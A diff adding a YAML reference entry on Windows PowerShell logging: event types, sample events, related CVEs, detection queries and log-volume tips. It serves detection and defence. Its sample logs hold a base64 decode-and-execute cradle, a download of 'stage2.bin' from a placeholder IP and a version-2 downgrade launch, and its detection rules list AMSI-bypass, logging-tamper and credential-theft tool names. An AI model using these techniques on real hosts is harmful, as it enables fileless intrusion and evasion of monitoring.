@@ -1,0 +1,392 @@
+# Secpedia entry — see CONTRIBUTING.md and schema/entry.schema.json
+id: windows-powershell
+name: Windows PowerShell Logging
+short: PowerShell
+aka:
+  - PowerShell Operational log
+  - Script Block Logging
+  - Module Logging
+  - PowerShellCore/Operational
+  - pwsh
+vendor: Microsoft
+category: os
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - windows
+  - powershell
+  - "4104"
+  - "4103"
+  - script block logging
+  - amsi
+  - living off the land
+summary: 'PowerShell operational log: script block, module and engine events (4103/4104/400/800). Script block logging (4104) records the de-obfuscated code PowerShell actually runs, module logging (4103/800) records each command and its parameters, and the classic engine events (400/403) record every session start with its host application and engine version. Together they are the main evidence for fileless attacks, download cradles, AMSI bypasses and PowerShell v2 downgrades.'
+sourcetypes:
+  - st: windows_powershell
+    desc: Microsoft-Windows-PowerShell/Operational events (4103 module, 4104 script block) as Windows event XML
+  - st: pwsh_installediismodules
+    desc: Scripted PowerShell inventory of IIS global modules (Get-WebGlobalModule output — Name, Image, preCondition) for spotting malicious native IIS modules
+  - st: pwsh_subjectinterfacepackage
+    desc: Scripted PowerShell inventory of registered Authenticode Subject Interface Packages (SIP DLLs under the Cryptography\OID registry keys) for SIP-hijack hunting
+  - st: XmlWinEventLog:Microsoft-Windows-PowerShell/Operational
+    desc: Splunk UF (renderXml=true) name for the PowerShell Operational channel
+  - st: WinEventLog:Windows PowerShell
+    desc: Classic "Windows PowerShell" log — engine (400/403), provider (600) and pipeline (800) events in rendered key=value text
+  - st: XmlWinEventLog:PowerShellCore/Operational
+    desc: PowerShell 7 (pwsh) Operational channel, same 4103/4104 event IDs, provider GUID f90714a8-5509-434a-bf6d-b1624c8a19a2
+  - st: POWERSHELL
+    desc: Google SecOps (Chronicle) log type for PowerShell event logs
+facts:
+  First released: 2006 (PowerShell 1.0); module logging since 3.0, script block logging since 5.0 (WMF 5.0)
+  Versions: Windows PowerShell 5.1 (in-box), PowerShell 7.4 LTS / 7.5 / 7.6 (pwsh, separate install)
+  Channels: Microsoft-Windows-PowerShell/Operational, Windows PowerShell (classic), PowerShellCore/Operational
+  Configuration: GPO Administrative Templates → Windows Components → Windows PowerShell (Module Logging, Script Block Logging, Transcription); powershell.config.json for pwsh
+  Key events: 4104 script block, 4103 / 800 pipeline execution, 400 / 403 engine start / stop, 4105 / 4106 script start / stop
+  Default behaviour: Without policy, 5.x still auto-logs script blocks it judges suspicious at Warning level (4104 Level 3)
+  Log transport: WEF, Splunk UF, Cribl Edge Windows Event Logs source, Azure Monitor Agent (DCR XPath), Winlogbeat
+  Typical volume: Workstations tens to hundreds of 4104/hour; servers with SCCM, DSC or monitoring agents can reach thousands/hour
+  Event size: 4104 ~1–30 KB (large script blocks split across events by MessageNumber / MessageTotal); 4103 ~2–6 KB
+placement:
+  slots:
+    - endpoint
+    - internal
+    - cloud
+  items:
+    - slot: endpoint
+      title: Workstations
+      desc: Phishing payloads, macros and LNK/HTA droppers almost always pass through PowerShell. 4104 on clients captures the decoded stage-2 code even when the command line was base64.
+    - slot: internal
+      title: Servers, DCs and Exchange
+      desc: Admin automation and remoting (WinRM 5985/5986) run here, and so does attacker lateral movement. Exchange uses PowerShell remoting internally, which is the path ProxyNotShell abused. IIS hosts add module inventory.
+    - slot: cloud
+      title: Cloud VMs and automation
+      desc: Azure Arc / AMA, AWS SSM Run Command and Intune scripts execute PowerShell on cloud and hybrid hosts. The same channels are collected by AMA or Cribl Edge.
+howItWorks:
+  - title: The engine and its hosts
+    body: PowerShell is a .NET automation engine hosted by powershell.exe, pwsh.exe, powershell_ise.exe, wsmprovhost.exe (remoting) or any process that loads System.Management.Automation. Every host start writes classic event 400 with HostApplication (the full command line) and EngineVersion.
+  - title: Script block logging (4104)
+    body: The engine logs every script block it compiles — scripts, functions, interactive commands and code built at runtime by Invoke-Expression or [ScriptBlock]::Create. Because it logs what is compiled, obfuscation layers are peeled off. Large blocks are split into parts sharing one ScriptBlockId.
+  - title: Module logging (4103 / 800)
+    body: For modules listed in the policy (often '*'), each pipeline execution is logged with ContextInfo (host, user, command name, script path) and Payload (CommandInvocation and ParameterBinding lines with the actual argument values).
+  - title: AMSI and auto-logging
+    body: Script content is passed to the Antimalware Scan Interface before execution, so Defender or another AV can block it. In parallel, PowerShell 5+ flags blocks matching a built-in list of suspicious tokens and logs them at Warning level even when script block logging is off.
+  - title: Downgrade and bypass
+    body: Version 2.0 of the engine predates script block logging and AMSI, so powershell.exe -Version 2 runs unlogged if the .NET 2/3.5 feature is present; the 400 event still shows EngineVersion=2.0. Attackers also patch AMSI in memory or flip the internal cachedGroupPolicySettings to disable logging, and those attempts appear in 4104 before they take effect.
+  - title: Inventory scripts
+    body: Scheduled or scripted PowerShell inputs (such as the IIS module and SIP inventories) write their own records — one line per installed component — to a forwarder, giving a periodic baseline to diff for persistence.
+traffic:
+  handles:
+    - Interactive and scripted PowerShell sessions (5.1 and 7.x)
+    - Remoting sessions over WinRM (wsmprovhost.exe) and SSH
+    - Runtime-generated code (Invoke-Expression, encoded commands, reflection)
+    - Module command execution with bound parameters
+    - Engine and provider lifecycle (start / stop, engine version)
+    - Periodic component inventories (IIS modules, SIPs)
+  flow:
+    - step: Launch
+      desc: A host process starts the engine (event 400 with HostApplication and EngineVersion).
+    - step: AMSI scan
+      desc: Script content is submitted to AMSI and the registered AV before execution.
+    - step: Compile and log
+      desc: Each script block is compiled and logged as 4104 (Verbose, or Warning if auto-flagged as suspicious).
+    - step: Execute
+      desc: Commands run; for logged modules each pipeline is written as 4103 (Operational) and 800 (classic) with parameters.
+    - step: Collect
+      desc: WEF, an agent or Cribl Edge reads the Operational and classic channels as XML or rendered text.
+    - step: Reassemble and route
+      desc: Cribl joins multi-part script blocks by ScriptBlockId, drops known-good automation and routes suspicious content to the SIEM.
+logs:
+  - type: Script block (4104)
+    sourcetype: windows_powershell
+    format: xml
+    share: 50–80 %
+    avg: ~3 KB
+    desc: The code PowerShell compiled, after de-obfuscation. Level 3 (Warning) marks a block auto-flagged as suspicious. Path is empty for interactive or runtime-generated code.
+    key:
+      - EventID
+      - ScriptBlockText
+      - ScriptBlockId
+      - MessageNumber
+      - MessageTotal
+      - Path
+      - Level
+      - Computer
+      - Security.UserID
+    noise:
+      - Provider.Guid
+      - Version
+      - Task
+      - Opcode
+      - Keywords
+      - Correlation.ActivityID
+      - Execution.ThreadID
+      - EventRecordID
+    sample: "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2026-11-12T09:14:24.118213400Z'/><EventRecordID>77120</EventRecordID><Correlation ActivityID='{8b1c2d3e-4f50-4a61-9b72-c3d4e5f60718}'/><Execution ProcessID='8000' ThreadID='7311'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WS042.corp.example.com</Computer><Security UserID='S-1-5-21-1111111111-2222222222-3333333333-1190'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAEAKVWbW/aSBD+3l+xQpwMKjF2CIQgRQoxpHHPJiY2SVMSXRZ7sbfYXne9DpC0'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()</Data><Data Name='ScriptBlockId'>3f9a1c2e-7d4b-4e8a-9c1f-0b2d3e4f5a6b</Data><Data Name='Path'></Data></EventData></Event>"
+  - type: Module / pipeline execution (4103)
+    sourcetype: windows_powershell
+    format: xml
+    share: 15–40 %
+    avg: ~3 KB
+    desc: One event per pipeline for logged modules. ContextInfo names the host application, user and script; Payload lists each CommandInvocation and its ParameterBinding values — here a download to disk from a documentation IP.
+    key:
+      - EventID
+      - ContextInfo
+      - Payload
+      - Computer
+      - Security.UserID
+    noise:
+      - Provider.Guid
+      - Version
+      - Task
+      - Opcode
+      - Keywords
+      - Execution.ThreadID
+      - UserData
+    sample: "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2026-11-12T09:14:26.540118900Z'/><EventRecordID>77131</EventRecordID><Correlation ActivityID='{8b1c2d3e-4f50-4a61-9b72-c3d4e5f60718}'/><Execution ProcessID='8000' ThreadID='7311'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WS042.corp.example.com</Computer><Security UserID='S-1-5-21-1111111111-2222222222-3333333333-1190'/></System><EventData><Data Name='ContextInfo'>Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.4648 Host ID = 6c1d2e3f-4a5b-4c6d-8e7f-90a1b2c3d4e5 Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -File C:\\Users\\jdoe\\AppData\\Local\\Temp\\upd.ps1 Engine Version = 5.1.19041.4648 Runspace ID = 0a1b2c3d-4e5f-4a6b-9c7d-8e9f0a1b2c3d Pipeline ID = 7 Command Name = Invoke-WebRequest Command Type = Cmdlet Script Name = C:\\Users\\jdoe\\AppData\\Local\\Temp\\upd.ps1 Command Path = Sequence Number = 41 User = CORP\\jdoe Connected User = Shell ID = Microsoft.PowerShell</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(Invoke-WebRequest): \"Invoke-WebRequest\" ParameterBinding(Invoke-WebRequest): name=\"Uri\"; value=\"http://203.0.113.50/stage2.bin\" ParameterBinding(Invoke-WebRequest): name=\"OutFile\"; value=\"C:\\Users\\Public\\stage2.bin\" ParameterBinding(Invoke-WebRequest): name=\"UseBasicParsing\"; value=\"True\"</Data></EventData></Event>"
+  - type: Engine started (400, classic)
+    sourcetype: WinEventLog:Windows PowerShell
+    format: kv
+    share: 5–15 %
+    avg: ~1.5 KB
+    desc: Engine state change to Available — one per PowerShell session, with the full HostApplication command line and EngineVersion. EngineVersion=2.0 is a downgrade that bypasses script block logging and AMSI.
+    key:
+      - EventCode
+      - ComputerName
+      - NewEngineState
+      - HostName
+      - HostApplication
+      - EngineVersion
+    noise:
+      - header
+      - LogName
+      - SourceName
+      - EventType
+      - Type
+      - RecordNumber
+      - OpCode
+      - Keywords
+      - PreviousEngineState
+      - SequenceNumber
+      - HostId
+      - RunspaceId
+      - PipelineId
+      - CommandName
+      - CommandType
+      - ScriptName
+      - CommandPath
+      - CommandLine
+    sample: '11/12/2026 09:14:21 AM LogName=Windows PowerShell SourceName=PowerShell EventCode=400 EventType=4 Type=Information ComputerName=WS042.corp.example.com TaskCategory=Engine Lifecycle OpCode=Info RecordNumber=60213 Keywords=Classic Message=Engine state is changed from None to Available. Details: NewEngineState=Available PreviousEngineState=None SequenceNumber=13 HostName=ConsoleHost HostVersion=2.0 HostId=5e6f7a8b-9c0d-4e1f-a2b3-c4d5e6f7a8b9 HostApplication=powershell.exe -Version 2 -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA EngineVersion=2.0 RunspaceId=1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine='
+  - type: IIS global module inventory
+    sourcetype: pwsh_installediismodules
+    format: kv
+    share: < 1 %
+    avg: ~400 B
+    desc: One line per IIS global module from a scheduled PowerShell inventory (Get-WebGlobalModule). Legitimate native modules live under %windir%\System32\inetsrv; a module loaded from a temp or user path is a classic IIS backdoor.
+    key:
+      - Name
+      - Image
+      - preCondition
+      - PSComputerName
+    noise:
+      - header
+      - ItemXPath
+      - ElementTagName
+      - IsLocallyStored
+      - Schema
+    sample: '2026-11-12T06:00:04Z Name="SessionAuthModule" Image="C:\Windows\Temp\iisauth64.dll" preCondition="bitness64" ItemXPath="/system.webServer/globalModules/add[@name=''SessionAuthModule'']" ElementTagName="add" IsLocallyStored="True" PSComputerName="WEB01.corp.example.com" Schema="Microsoft.IIs.PowerShell.Framework.ConfigurationElementSchema"'
+cves:
+  - id: CVE-2026-70337
+    cvss: 8.8
+    year: 2026
+    kev: false
+    scope: device
+    title: PowerShell 7 relative path traversal — remote code execution (user interaction required)
+    affected: PowerShell 7.4 before 7.4.19, 7.5 before 7.5.10, 7.6 before 7.6.5
+    fixed: PowerShell 7.4.19 / 7.5.10 / 7.6.5 (August 2026)
+    detect: Inventory pwsh.exe versions (400 HostVersion / EngineVersion on PowerShellCore); 4104 blocks loading modules or scripts from unexpected relative or UNC paths shortly after a user opens downloaded content.
+    avoid: Update PowerShell 7 (Microsoft Update for pwsh can be enabled at install); remove unused side-by-side versions.
+  - id: CVE-2026-50523
+    cvss: 7.8
+    year: 2026
+    kev: false
+    scope: device
+    title: PowerShell 7 command injection — local code execution by an authorised attacker (Windows only)
+    affected: PowerShell 7.4 before 7.4.19, 7.5 before 7.5.10, 7.6 before 7.6.5 on Windows
+    fixed: PowerShell 7.4.19 / 7.5.10 / 7.6.5 (August 2026)
+    detect: pwsh 4103 Payload or 4104 ScriptBlockText containing command separators or sub-expressions in arguments that should be data; unexpected child processes of pwsh.exe (Sysmon 1 / 4688).
+    avoid: Update PowerShell 7; enforce Constrained Language Mode with WDAC on endpoints that don't need full language.
+  - id: CVE-2025-54100
+    cvss: 7.8
+    year: 2025
+    kev: false
+    scope: device
+    title: Windows PowerShell 5.1 command injection — Invoke-WebRequest full DOM parsing could run script in a fetched page
+    affected: Windows PowerShell 5.1 on supported Windows clients and servers before the December 2025 updates
+    fixed: December 9, 2025 Windows updates (KB5074596 hardening — security prompt unless -UseBasicParsing)
+    detect: 4103 Payload with CommandInvocation(Invoke-WebRequest) and no UseBasicParsing binding against an external URL; 4104 blocks setting $PSDefaultParameterValues to suppress the prompt in unattended scripts.
+    avoid: Patch; use -UseBasicParsing or Invoke-RestMethod in scripts; migrate automation to PowerShell 7.
+  - id: CVE-2022-41076
+    cvss: 8.5
+    year: 2022
+    kev: false
+    scope: device
+    title: PowerShell remote code execution — escape from a restricted (Constrained Language / JEA) session
+    affected: PowerShell 7.2 before 7.2.8, 7.3 before 7.3.1, and Windows PowerShell before the December 2022 Windows updates
+    fixed: PowerShell 7.2.8 / 7.3.1 and the December 2022 Windows security updates
+    detect: 4104 in a JEA or remoting session (wsmprovhost.exe host) containing reflection, Add-Type or language-mode changes that the endpoint's role should not allow.
+    avoid: Patch; keep JEA role capabilities minimal; log and review remoting sessions.
+  - id: CVE-2022-41082
+    cvss: 8.0
+    year: 2022
+    kev: true
+    scope: traffic
+    title: ProxyNotShell — Exchange Server RCE through the PowerShell remoting endpoint, chained with CVE-2022-41040
+    affected: Exchange Server 2013 CU23, 2016 CU22 / CU23, 2019 CU11 / CU12 before the November 2022 SU
+    fixed: November 2022 Exchange Server Security Update (KB5019758)
+    detect: On Exchange servers, 4103 / 4104 under w3wp.exe (MSExchangePowerShellAppPool) running New-Object or Invoke-Expression, and w3wp spawning cmd / powershell; IIS logs with autodiscover.json ... /powershell paths.
+    avoid: Patch Exchange; block PowerShell remoting for non-admins; don't expose Exchange to the internet without a WAF.
+  - id: CVE-2022-41040
+    cvss: 8.8
+    year: 2022
+    kev: true
+    scope: traffic
+    title: ProxyNotShell SSRF — authenticated Autodiscover request reaches the backend PowerShell endpoint
+    affected: Exchange Server 2013 CU23, 2016 CU22 / CU23, 2019 CU11 / CU12 before the November 2022 SU
+    fixed: November 2022 Exchange Server Security Update (KB5019758)
+    detect: IIS / proxy logs with /autodiscover/autodiscover.json?@ ... &Email=autodiscover/autodiscover.json and Powershell in the URL, followed by remote PowerShell 4103 on the Exchange host.
+    avoid: Patch; apply the URL Rewrite mitigation on unpatched servers; enable Extended Protection.
+detections:
+  - title: Obfuscated or in-memory script block (download cradle / decode-and-execute)
+    severity: high
+    signals:
+      - EventID=4104
+      - ScriptBlockText contains FromBase64String, GzipStream, IEX / Invoke-Expression, DownloadString, Net.WebClient, Reflection.Assembly Load
+      - Level=3 (auto-flagged as suspicious)
+    why: Fileless loaders decode and execute payloads in memory. Script block logging sees the decoded layer, and the combination of decode + execute + network is rare in legitimate admin scripts.
+    kql: |-
+      dataset="powershell_logs" EventID="4104"
+      | where ScriptBlockText matches regex "(?i)(frombase64string|gzipstream|deflatestream).*(iex|invoke-expression)|(downloadstring|downloaddata|net\.webclient).*(iex|invoke-expression)|reflection\.assembly\]::load" or Level="3"
+      | summarize blocks=count(), first=min(_time) by Computer, Security.UserID, ScriptBlockId
+    mitre:
+      - T1059.001
+      - T1027
+      - T1105
+  - title: AMSI bypass or logging tamper attempt
+    severity: critical
+    signals:
+      - EventID=4104
+      - ScriptBlockText contains AmsiUtils, amsiInitFailed, AmsiScanBuffer, cachedGroupPolicySettings, EnableScriptBlockLogging
+      - Set-MpPreference -DisableRealtimeMonitoring / -ExclusionPath
+    why: Attackers disable AMSI or PowerShell logging before running their real payload. The tamper attempt itself is logged and has no legitimate use.
+    kql: |-
+      dataset="powershell_logs" EventID="4104"
+      | where ScriptBlockText matches regex "(?i)amsiutils|amsiinitfailed|amsiscanbuffer|cachedgrouppolicysettings|enablescriptblocklogging|disablerealtimemonitoring|add-mppreference.*exclusion"
+      | summarize n=count() by Computer, Security.UserID, Path
+    mitre:
+      - T1562.001
+      - T1059.001
+  - title: PowerShell version 2 downgrade
+    severity: high
+    signals:
+      - EventCode=400
+      - EngineVersion starts with 2.
+      - HostApplication contains -Version 2 or -v 2
+    why: The 2.0 engine has no script block logging and no AMSI. Modern management tooling does not need it, so a 2.0 session on a host with 5.1 is evasion.
+    kql: |-
+      dataset="powershell_logs" EventCode="400" EngineVersion="2.*"
+      | summarize sessions=count(), cmds=values(HostApplication) by ComputerName, bin(_time, 1h)
+    mitre:
+      - T1689
+      - T1059.001
+  - title: Download to disk via PowerShell cmdlets
+    severity: medium
+    signals:
+      - EventID=4103
+      - Payload has Invoke-WebRequest / Start-BitsTransfer / DownloadFile with OutFile or Destination
+      - URI is a raw IP or a newly-seen domain
+    why: Module logging records the bound parameters, so the exact URL and the file written are visible. Raw-IP URLs and writes to Public, Temp or ProgramData are typical staging.
+    kql: |-
+      dataset="powershell_logs" EventID="4103"
+      | where Payload matches regex "(?i)(invoke-webrequest|start-bitstransfer|downloadfile)" and Payload matches regex "(?i)https?://\d{1,3}(\.\d{1,3}){3}|\\\\users\\\\public\\\\|\\\\programdata\\\\|\\\\temp\\\\"
+      | summarize n=count() by Computer, Security.UserID, Payload
+    mitre:
+      - T1105
+      - T1059.001
+  - title: Offensive PowerShell tooling (credential theft, Kerberoasting)
+    severity: critical
+    signals:
+      - EventID=4104
+      - ScriptBlockText contains Invoke-Mimikatz, sekurlsa, Invoke-Kerberoast, Get-GPPPassword, MiniDumpWriteDump, PowerView functions
+    why: Public offensive frameworks (PowerSploit, Empire, Nishang) keep their function names. A match on a non-lab host is near-certain malicious use.
+    kql: |-
+      dataset="powershell_logs" EventID="4104"
+      | where ScriptBlockText matches regex "(?i)invoke-mimikatz|sekurlsa|invoke-kerberoast|get-gpppassword|minidumpwritedump|get-domainuser|invoke-sharefinder"
+      | summarize n=count(), first=min(_time) by Computer, Security.UserID
+    mitre:
+      - T1003.001
+      - T1558.003
+  - title: IIS module loaded from a non-standard path
+    severity: high
+    signals:
+      - sourcetype pwsh_installediismodules
+      - Image not under %windir%\System32\inetsrv or a known vendor directory
+      - Name not seen in the previous inventory
+    why: Native IIS modules see every request and response; backdoors such as malicious authentication or filter modules are registered as global modules from writable paths.
+    kql: |-
+      dataset="powershell_logs" sourcetype="pwsh_installediismodules"
+      | where not(Image matches regex "(?i)^%windir%\\\\system32\\\\inetsrv\\\\|^c:\\\\windows\\\\system32\\\\inetsrv\\\\")
+      | summarize first=min(_time), hosts=dcount(PSComputerName) by Name, Image
+    mitre:
+      - T1505.004
+optimizations:
+  - title: Suppress repeated script blocks from management agents
+    saving: 30–70 %
+    fn: Suppress
+    how: SCCM, DSC, Intune and monitoring agents run the same scripts every few minutes. Hash ScriptBlockText and keep one per host per hash per hour, with a count; new hashes always pass.
+    expr: "key: `${Computer}:${C.Crypto.md5(ScriptBlockText)}`  allow 1 / 3600s  when EventID=='4104' && Level!='3'"
+  - title: Drop start/stop invocation noise
+    saving: 10–30 %
+    fn: Drop
+    how: 4105 / 4106 (script block invocation start / stop), 40961 / 40962 (console starting / ready) and 53504 carry no content beyond a ScriptBlockId or a timestamp. Drop them, or keep in Lake.
+    expr: "['4105','4106','40961','40962','53504'].includes(EventID)"
+  - title: Strip XML boilerplate and verbose ContextInfo
+    saving: 20–35 %
+    fn: Parser → Eval
+    how: Remove the static System block (Provider Guid, Version, Task, Opcode, Keywords, ThreadID, Correlation) and parse ContextInfo into a few fields (host application, command, script, user) instead of keeping the padded text.
+    expr: "remove: Provider.Guid, Version, Task, Opcode, Keywords, Execution.ThreadID, Correlation.ActivityID, UserData"
+  - title: Reassemble multi-part script blocks
+    saving: fewer events, better detections
+    fn: Aggregations
+    how: Join 4104 parts that share ScriptBlockId (MessageNumber 1..MessageTotal) into one event before routing, so content-matching rules see the whole script and the SIEM indexes one record instead of many.
+    expr: "group by ScriptBlockId, Computer; concat ScriptBlockText ordered by MessageNumber; emit when count == MessageTotal or after 30s"
+  - title: Route by risk
+    saving: SIEM licence
+    fn: Routes
+    how: Warning-level 4104, 400 with EngineVersion 2.x, offensive-keyword hits and 4103 network/download commands go to the SIEM; the bulk of verbose 4103 / 800 pipeline events and inventories go to Lake for hunting.
+    expr: "(EventID=='4104' && Level=='3') || (EventCode=='400' && /^2\\./.test(EngineVersion)) → SIEM"
+references:
+  - title: Microsoft — about_Logging_Windows (PowerShell 7)
+    url: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
+  - title: Microsoft — Invoke-WebRequest (PowerShell 5.1, CVE-2025-54100 warning)
+    url: https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1
+  - title: Microsoft Support — PowerShell 5.1 Invoke-WebRequest preventing script execution (KB5074596)
+    url: https://support.microsoft.com/en-us/servicing/os/windows/2025/12/powershell-5-1-invoke-webrequest-preventing-script-execution-from-web-content
+  - title: NVD — CVE-2026-70337 (PowerShell 7 path traversal RCE)
+    url: https://nvd.nist.gov/vuln/detail/cve-2026-70337
+  - title: PowerShell Announcements — CVE-2026-50523 advisory
+    url: https://github.com/PowerShell/Announcements/issues/86
+  - title: Microsoft — Released November 2022 Exchange Server Security Updates (ProxyNotShell fix)
+    url: https://techcommunity.microsoft.com/blog/exchange/released-november-2022-exchange-server-security-updates/3669045
+  - title: MITRE ATT&CK T1059.001 PowerShell
+    url: https://attack.mitre.org/techniques/T1059/001/
+  - title: MITRE ATT&CK T1689 Downgrade Attack
+    url: https://attack.mitre.org/techniques/T1689/
+related:
+  - win-security
+  - sysmon
+  - mde
+  - active-directory
+  - iis
+  - o365
